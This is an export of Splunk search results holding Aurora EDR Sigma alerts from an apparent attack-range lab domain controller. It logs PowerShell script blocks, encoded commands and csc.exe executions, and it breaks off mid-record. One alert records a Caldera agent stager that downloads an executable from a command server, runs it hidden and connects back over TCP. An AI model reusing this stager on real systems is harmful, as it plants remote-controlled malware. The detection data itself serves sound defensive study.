{"preview":false,"result":{"_raw":"{\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{28083AC2-3AE2-0001-9944-0828E23AD801}\",\"EventID\":\"4104\",\"Execution_ProcessID\":\"3784\",\"Execution_ThreadID\":\"5068\",\"Keywords\":\"0x0\",\"Level\":\"3\",\"Match_Strings\":\"'.LastWriteTime =' in ScriptBlockText\",\"MessageNumber\":\"1\",\"MessageTotal\":\"1\",\"Module\":\"Sigma\",\"Opcode\":\"15\",\"Path\":\"\",\"Provider_Guid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"Provider_Name\":\"Microsoft-Windows-PowerShell\",\"Rule_Author\":\"frack113\",\"Rule_Description\":\"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder.\",\"Rule_FalsePositives\":\"Legitimeate admin script\",\"Rule_Id\":\"c6438007-e081-42ce-9483-b067fbef33c3\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/powershell/powershell_script/posh_ps_timestomp.yml\",\"Rule_Modified\":\"2021/10/16\",\"Rule_Path\":\"public\\\\windows\\\\powershell\\\\powershell_script\\\\posh_ps_timestomp.yml\",\"Rule_References\":\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md, https://www.offensive-security.com/metasploit-unleashed/timestomp/\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Powershell Timestomp\",\"ScriptBlockId\":\"61444fa5-f863-42f9-a9af-6b0068828c2f\",\"ScriptBlockText\":\"#!powershell\\n\\n# Copyright: (c) 2017, Ansible Project\\n# GNU General Public License v3.0+ (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)\\n\\n#Requires -Module Ansible.ModuleUtils.Legacy\\n\\n$ErrorActionPreference = \\\"Stop\\\"\\n\\n$params = Parse-Args $args -supports_check_mode $true\\n\\n$check_mode = Get-AnsibleParam -obj $params -name \\\"_ansible_check_mode\\\" -default $false\\n$_remote_tmp = Get-AnsibleParam $params \\\"_ansible_remote_tmp\\\" -type \\\"path\\\" -default $env:TMP\\n\\n$path = Get-AnsibleParam -obj $params -name \\\"path\\\" -type \\\"path\\\" -failifempty $true -aliases \\\"dest\\\",\\\"name\\\"\\n$state = Get-AnsibleParam -obj $params -name \\\"state\\\" -type \\\"str\\\" -validateset \\\"absent\\\",\\\"directory\\\",\\\"file\\\",\\\"touch\\\"\\n\\n# used in template/copy when dest is the path to a dir and source is a file\\n$original_basename = Get-AnsibleParam -obj $params -name \\\"_original_basename\\\" -type \\\"str\\\"\\nif ((Test-Path -LiteralPath $path -PathType Container) -and ($null -ne $original_basename)) {\\n    $path = Join-Path -Path $path -ChildPath $original_basename\\n}\\n\\n$result = @{\\n    changed = $false\\n}\\n\\n# Used to delete symlinks as powershell cannot delete broken symlinks\\n$symlink_util = @\\\"\\nusing System;\\nusing System.ComponentModel;\\nusing System.Runtime.InteropServices;\\n\\nnamespace Ansible.Command {\\n    public class SymLinkHelper {\\n        [DllImport(\\\"kernel32.dll\\\", CharSet=CharSet.Unicode, SetLastError=true)]\\n        public static extern bool DeleteFileW(string lpFileName);\\n\\n        [DllImport(\\\"kernel32.dll\\\", CharSet=CharSet.Unicode, SetLastError=true)]\\n        public static extern bool RemoveDirectoryW(string lpPathName);\\n\\n        public static void DeleteDirectory(string path) {\\n            if (!RemoveDirectoryW(path))\\n                throw new Exception(String.Format(\\\"RemoveDirectoryW({0}) failed: {1}\\\", path, new Win32Exception(Marshal.GetLastWin32Error()).Message));\\n        }\\n\\n        public static void DeleteFile(string path) {\\n            if (!DeleteFileW(path))\\n                throw new Exception(String.Format(\\\"DeleteFileW({0}) failed: {1}\\\", path, new Win32Exception(Marshal.GetLastWin32Error()).Message));\\n        }\\n    }\\n}\\n\\\"@\\n$original_tmp = $env:TMP\\n$env:TMP = $_remote_tmp\\nAdd-Type -TypeDefinition $symlink_util\\n$env:TMP = $original_tmp\\n\\n# Used to delete directories and files with logic on handling symbolic links\\nfunction Remove-File($file, $checkmode) {\\n    try {\\n        if ($file.Attributes -band [System.IO.FileAttributes]::ReparsePoint) {\\n            # Bug with powershell, if you try and delete a symbolic link that is pointing\\n            # to an invalid path it will fail, using Win32 API to do this instead\\n            if ($file.PSIsContainer) {\\n                if (-not $checkmode) {\\n                    [Ansible.Command.SymLinkHelper]::DeleteDirectory($file.FullName)\\n                }\\n            } else {\\n                if (-not $checkmode) {\\n                    [Ansible.Command.SymlinkHelper]::DeleteFile($file.FullName)\\n                }\\n            }\\n        } elseif ($file.PSIsContainer) {\\n            Remove-Directory -directory $file -checkmode $checkmode\\n        } else {\\n            Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$checkmode\\n        }\\n    } catch [Exception] {\\n        Fail-Json $result \\\"Failed to delete $($file.FullName): $($_.Exception.Message)\\\"\\n    }\\n}\\n\\nfunction Remove-Directory($directory, $checkmode) {\\n    foreach ($file in Get-ChildItem -LiteralPath $directory.FullName) {\\n        Remove-File -file $file -checkmode $checkmode\\n    }\\n    Remove-Item -LiteralPath $directory.FullName -Force -Recurse -WhatIf:$checkmode\\n}\\n\\n\\nif ($state -eq \\\"touch\\\") {\\n    if (Test-Path -LiteralPath $path) {\\n        if (-not $check_mode) {\\n            (Get-ChildItem -LiteralPath $path).LastWriteTime = Get-Date\\n        }\\n        $result.changed = $true\\n    } else {\\n        Write-Output $null | Out-File -LiteralPath $path -Encoding ASCII -WhatIf:$check_mode\\n        $result.changed = $true\\n    }\\n}\\n\\nif (Test-Path -LiteralPath $path) {\\n    $fileinfo = Get-Item -LiteralPath $path -Force\\n    if ($state -eq \\\"absent\\\") {\\n        Remove-File -file $fileinfo -checkmode $check_mode\\n        $result.changed = $true\\n    } else {\\n        if ($state -eq \\\"directory\\\" -and -not $fileinfo.PsIsContainer) {\\n            Fail-Json $result \\\"path $path is not a directory\\\"\\n        }\\n\\n        if ($state -eq \\\"file\\\" -and $fileinfo.PsIsContainer) {\\n            Fail-Json $result \\\"path $path is not a file\\\"\\n        }\\n    }\\n\\n} else {\\n\\n    # If state is not supplied, test the $path to see if it looks like\\n    # a file or a folder and set state to file or folder\\n    if ($null -eq $state) {\\n        $basename = Split-Path -Path $path -Leaf\\n        if ($basename.length -gt 0) {\\n           $state = \\\"file\\\"\\n        } else {\\n           $state = \\\"directory\\\"\\n        }\\n    }\\n\\n    if ($state -eq \\\"directory\\\") {\\n        try {\\n            New-Item -Path $path -ItemType Directory -WhatIf:$check_mode | Out-Null\\n        } catch {\\n            if ($_.CategoryInfo.Category -eq \\\"ResourceExists\\\") {\\n                $fileinfo = Get-Item -LiteralPath $_.CategoryInfo.TargetName\\n                if ($state -eq \\\"directory\\\" -and -not $fileinfo.PsIsContainer) {\\n                    Fail-Json $result \\\"path $path is not a directory\\\"\\n                }\\n            } else {\\n                Fail-Json $result $_.Exception.Message\\n            }\\n        }\\n        $result.changed = $true\\n    } elseif ($state -eq \\\"file\\\") {\\n        Fail-Json $result \\\"path $path will not be created\\\"\\n    }\\n\\n}\\n\\nExit-Json $result\\n\",\"Security_UserID\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"Task\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:10:13.334338Z\",\"Version\":\"1\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:14Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":["err0r","nix-all-logs","nix_errors"],"host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"----\",\"\":\"{----}\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","tag":"error","tag::eventtype":"error","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{28083AC2-3AE2-0006-1C40-0828E23AD801}\",\"EventID\":\"4104\",\"Execution_ProcessID\":\"3652\",\"Execution_ThreadID\":\"2228\",\"Keywords\":\"0x0\",\"Level\":\"5\",\"Match_Strings\":\"Net.WebClient in ScriptBlockText\",\"MessageNumber\":\"1\",\"MessageTotal\":\"1\",\"Module\":\"Sigma\",\"Opcode\":\"15\",\"Path\":\"C:\\\\caldera_manx_agent.ps1\",\"Provider_Guid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"Provider_Name\":\"Microsoft-Windows-PowerShell\",\"Rule_Author\":\"James Pemberton / @4A616D6573\",\"Rule_Description\":\"Detects the use of various web request methods (including aliases) via Windows PowerShell command\",\"Rule_FalsePositives\":\"Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\",\"Rule_Id\":\"1139d2e2-84b1-4226-b445-354492eba8ba\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/powershell/powershell_script/posh_ps_web_request.yml\",\"Rule_Modified\":\"2021/10/16\",\"Rule_Path\":\"public\\\\windows\\\\powershell\\\\powershell_script\\\\posh_ps_web_request.yml\",\"Rule_References\":\"https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/, https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Windows PowerShell Web Request\",\"ScriptBlockId\":\"4a888945-2c86-45e2-a44e-714d81a3f470\",\"ScriptBlockText\":\"#manx splunk attack range TCP agent code\\r\\nif ($host.Version.Major -ge 3){$ErrAction= \\\"ignore\\\"}else{$ErrAction= \\\"SilentlyContinue\\\"};$server=\\\"http://10.0.1.12:8888\\\";$socket=\\\"10.0.1.12:7010\\\";$contact=\\\"tcp\\\";$url=\\\"$server/file/download\\\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\\\"platform\\\",\\\"windows\\\");$wc.Headers.add(\\\"file\\\",\\\"manx.go\\\");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders[\\\"Content-Disposition\\\"].Substring($wc.ResponseHeaders[\\\"Content-Disposition\\\"].IndexOf(\\\"filename=\\\")+9).Replace(\\\"`\\\"\\\",\\\"\\\");Get-Process | ? {$_.Path -like \\\"C:\\\\Users\\\\Public\\\\$name.exe\\\"} | stop-process -f -ea $ErrAction;rm -force \\\"C:\\\\Users\\\\Public\\\\$name.exe\\\" -ea $ErrAction;([io.file]::WriteAllBytes(\\\"C:\\\\Users\\\\Public\\\\$name.exe\\\",$data)) | Out-Null;Start-Process -FilePath C:\\\\Users\\\\Public\\\\$name.exe -ArgumentList \\\"-socket $socket -http $server -contact tcp\\\" -WindowStyle hidden;\\r\\n\",\"Security_UserID\":\"S-1-5-18\",\"Task\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:10:11.9629019Z\",\"Version\":\"1\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:13Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"----\",\"\":\"{----}\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\\\" /noconfig /fullpaths @\\\"C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\0hs4ogmv\\\\0hs4ogmv.cmdline\\\"\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304977\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"464\",\"Image\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"\\\\AppData\\\\ in CommandLine, \\\\csc.exe in Image\",\"Module\":\"Sigma\",\"NewProcessId\":\"4584\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ProcessId\":\"3324\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)\",\"Rule_FalsePositives\":\"https://twitter.com/gN3mes1s/status/1206874118282448897, https://twitter.com/gabriele_pippi/status/1206907900268072962\",\"Rule_Id\":\"dcaa3f04-70c3-427a-80b4-b870d73c94c4\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_csc_folder.yml\",\"Rule_Modified\":\"2021/02/01\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_csc_folder.yml\",\"Rule_References\":\"https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/, https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf, https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/, https://twitter.com/gN3mes1s/status/1206874118282448897\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Csc.exe Source File Folder\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0x103dfa\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:10:04.792776Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:06Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\.\\\\\\\\..\\\\.\\\"_/_/_@\\\":\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\\\" /noconfig /fullpaths @\\\"C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\rikndpel.cmdline\\\"\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304970\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"2536\",\"Image\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"\\\\AppData\\\\ in CommandLine, \\\\csc.exe in Image\",\"Module\":\"Sigma\",\"NewProcessId\":\"4312\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ProcessId\":\"3324\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)\",\"Rule_FalsePositives\":\"https://twitter.com/gN3mes1s/status/1206874118282448897, https://twitter.com/gabriele_pippi/status/1206907900268072962\",\"Rule_Id\":\"dcaa3f04-70c3-427a-80b4-b870d73c94c4\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_csc_folder.yml\",\"Rule_Modified\":\"2021/02/01\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_csc_folder.yml\",\"Rule_References\":\"https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/, https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf, https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/, https://twitter.com/gN3mes1s/status/1206874118282448897\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Csc.exe Source File Folder\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0x103dfa\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:10:04.4505206Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:06Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\.\\\\\\\\..\\\\.\\\"_/_/_@\\\":\\\\\\\\\\\\\\\\\\\\\\\\.\\\"\",","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UwBlAHQALQBTAHQAcgBpAGMAdABNAG8AZABlACAALQBWAGUAcgBzAGkAbwBuACAATABhAHQAZQBzAHQACgAkAHQAbQBwAF8AcABhAHQAaAAgAD0AIABbAFMAeQBzAHQAZQBtAC4ARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AEUAeABwAGEAbgBkAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABWAGEAcgBpAGEAYgBsAGUAcwAoACcAJQBUAEUATQBQACUAJwApAAoAJAB0AG0AcAAgAD0AIABOAGUAdwAtAEkAdABlAG0AIAAtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAC0AUABhAHQAaAAgACQAdABtAHAAXwBwAGEAdABoACAALQBOAGEAbQBlACAAJwBhAG4AcwBpAGIAbABlAC0AdABtAHAALQAxADYANAA3ADYAMQA5ADgAMAAyAC4AMwA0ADgANgA3ADgANgAtADEAOAA4ADMANgA1ADcALQAxADYANgA2ADgANQAwADYAMAA2ADEANwAyADcANwAnAAoAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAdABtAHAALgBGAHUAbABsAE4AYQBtAGUACgBJAGYAIAAoAC0AbgBvAHQAIAAkAD8AKQAgAHsAIABJAGYAIAAoAEcAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAATABBAFMAVABFAFgASQBUAEMATwBEAEUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAKQAgAHsAIABlAHgAaQB0ACAAJABMAEEAUwBUAEUAWABJAFQAQwBPAEQARQAgAH0AIABFAGwAcwBlACAAewAgAGUAeABpAHQAIAAxACAAfQAgAH0A\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304943\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"5016\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"' -E' in CommandLine, ' -E' in CommandLine, ' UwB' in CommandLine\",\"Module\":\"Sigma\",\"NewProcessId\":\"2308\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ProcessId\":\"3240\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community\",\"Rule_Description\":\"Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)\",\"Rule_FalsePositives\":\"\",\"Rule_Id\":\"ca2092a1-c273-4878-9b4b-0d60115bf5ea\",\"Rule_Level\":\"high\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_powershell_enc_cmd.yml\",\"Rule_Modified\":\"2021/03/02\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_powershell_enc_cmd.yml\",\"Rule_References\":\"https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Encoded PowerShell Command Line\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0x103dfa\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:10:02.6652933Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"warning\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:06Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\\\\\\\\\.\\\\.\\\"_-_-_-__-_\",\"\":\"----..\",\"\":\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\\\" /noconfig /fullpaths @\\\"C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\5ecbxxya.cmdline\\\"\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304897\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"464\",\"Image\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"\\\\AppData\\\\ in CommandLine, \\\\csc.exe in Image\",\"Module\":\"Sigma\",\"NewProcessId\":\"3392\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ProcessId\":\"4180\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)\",\"Rule_FalsePositives\":\"https://twitter.com/gN3mes1s/status/1206874118282448897, https://twitter.com/gabriele_pippi/status/1206907900268072962\",\"Rule_Id\":\"dcaa3f04-70c3-427a-80b4-b870d73c94c4\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_csc_folder.yml\",\"Rule_Modified\":\"2021/02/01\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_csc_folder.yml\",\"Rule_References\":\"https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/, https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf, https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/, https://twitter.com/gN3mes1s/status/1206874118282448897\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Csc.exe Source File Folder\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0xfe934\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:10:00.7859372Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:05Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\.\\\\\\\\..\\\\.\\\"_/_/_@\\\":\\\\\\\\\\\\\\\\\\\\\\\\.\\\"\",","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\\\" /noconfig /fullpaths @\\\"C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\ljvemkhu\\\\ljvemkhu.cmdline\\\"\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304846\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"464\",\"Image\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"\\\\AppData\\\\ in CommandLine, \\\\csc.exe in Image\",\"Module\":\"Sigma\",\"NewProcessId\":\"2500\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ProcessId\":\"8\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)\",\"Rule_FalsePositives\":\"https://twitter.com/gN3mes1s/status/1206874118282448897, https://twitter.com/gabriele_pippi/status/1206907900268072962\",\"Rule_Id\":\"dcaa3f04-70c3-427a-80b4-b870d73c94c4\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_csc_folder.yml\",\"Rule_Modified\":\"2021/02/01\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_csc_folder.yml\",\"Rule_References\":\"https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/, https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf, https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/, https://twitter.com/gN3mes1s/status/1206874118282448897\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Csc.exe Source File 